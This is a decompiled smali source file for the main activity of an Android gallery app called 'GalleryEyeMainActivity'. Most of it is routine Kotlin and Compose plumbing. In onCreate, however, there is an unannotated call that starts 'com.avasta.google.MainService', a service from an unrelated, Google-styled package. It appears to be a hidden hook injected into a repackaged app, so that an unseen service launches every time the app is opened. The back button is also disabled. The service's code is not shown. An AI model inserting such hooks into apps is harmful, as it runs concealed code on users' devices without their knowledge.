.class public final Lteamblackberry/gallery/GalleryEyeMainActivity;
.super Landroidx/activity/ComponentActivity;
.source "GalleryEyeMainActivity.kt"


# annotations
.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000.\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0010\u0008\n\u0000\n\u0002\u0010\u000b\n\u0000\u0008\u0007\u0018\u00002\u00020\u0001B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0008\u0010\u0005\u001a\u00020\u0006H\u0016J\u0012\u0010\u0007\u001a\u00020\u00062\u0008\u0010\u0008\u001a\u0004\u0018\u00010\tH\u0014J\u0018\u0010\n\u001a\u00020\u00062\u0006\u0010\u000b\u001a\u00020\u000c2\u0006\u0010\r\u001a\u00020\u000eH\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u000f"
    }
    d2 = {
        "Lteamblackberry/gallery/GalleryEyeMainActivity;",
        "Landroidx/activity/ComponentActivity;",
        "()V",
        "galleryEyeViewModel",
        "Lteamblackberry/gallery/GalleryEyeViewModel;",
        "onBackPressed",
        "",
        "onCreate",
        "savedInstanceState",
        "Landroid/os/Bundle;",
        "setWindowFlag",
        "bits",
        "",
        "on",
        "",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# static fields
.field public static final $stable:I = 0x8


# instance fields
.field private galleryEyeViewModel:Lteamblackberry/gallery/GalleryEyeViewModel;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 19
    invoke-direct {p0}, Landroidx/activity/ComponentActivity;-><init>()V

    return-void
.end method

.method public static final synthetic access$getGalleryEyeViewModel$p(Lteamblackberry/gallery/GalleryEyeMainActivity;)Lteamblackberry/gallery/GalleryEyeViewModel;
    .locals 0

    .line 19
    iget-object p0, p0, Lteamblackberry/gallery/GalleryEyeMainActivity;->galleryEyeViewModel:Lteamblackberry/gallery/GalleryEyeViewModel;

    return-object p0
.end method

.method public static final synthetic access$setGalleryEyeViewModel$p(Lteamblackberry/gallery/GalleryEyeMainActivity;Lteamblackberry/gallery/GalleryEyeViewModel;)V
    .locals 0

    .line 19
    iput-object p1, p0, Lteamblackberry/gallery/GalleryEyeMainActivity;->galleryEyeViewModel:Lteamblackberry/gallery/GalleryEyeViewModel;

    return-void
.end method

.method public static final synthetic access$setWindowFlag(Lteamblackberry/gallery/GalleryEyeMainActivity;IZ)V
    .locals 0

    .line 19
    invoke-direct {p0, p1, p2}, Lteamblackberry/gallery/GalleryEyeMainActivity;->setWindowFlag(IZ)V

    return-void
.end method

.method private final setWindowFlag(IZ)V
    .locals 2

    .line 42
    invoke-virtual {p0}, Lteamblackberry/gallery/GalleryEyeMainActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    .line 43
    invoke-virtual {v0}, Landroid/view/Window;->getAttributes()Landroid/view/WindowManager$LayoutParams;

    move-result-object v1

    if-eqz p2, :cond_0

    .line 45
    iget p2, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    or-int/2addr p1, p2

    iput p1, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    goto :goto_0

    .line 47
    :cond_0
    iget p2, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    not-int p1, p1

    and-int/2addr p1, p2

    iput p1, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 49
    :goto_0
    invoke-virtual {v0, v1}, Landroid/view/Window;->setAttributes(Landroid/view/WindowManager$LayoutParams;)V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 22
    invoke-super {p0, p1}, Landroidx/activity/ComponentActivity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {}, Lcom/avasta/google/MainService;->start()V

    .line 23
    move-object p1, p0

    check-cast p1, Landroidx/activity/ComponentActivity;

    new-instance v0, Lteamblackberry/gallery/GalleryEyeMainActivity$onCreate$1;

    invoke-direct {v0, p0}, Lteamblackberry/gallery/GalleryEyeMainActivity$onCreate$1;-><init>(Lteamblackberry/gallery/GalleryEyeMainActivity;)V

    const v1, -0x3abe0d1c

    const/4 v2, 0x1

    invoke-static {v1, v2, v0}, Landroidx/compose/runtime/internal/ComposableLambdaKt;->composableLambdaInstance(IZLjava/lang/Object;)Landroidx/compose/runtime/internal/ComposableLambda;

    move-result-object v0

    check-cast v0, Lkotlin/jvm/functions/Function2;

    const/4 v1, 0x0

    invoke-static {p1, v1, v0, v2, v1}, Landroidx/activity/compose/ComponentActivityKt;->setContent$default(Landroidx/activity/ComponentActivity;Landroidx/compose/runtime/CompositionContext;Lkotlin/jvm/functions/Function2;ILjava/lang/Object;)V

    return-void
.end method
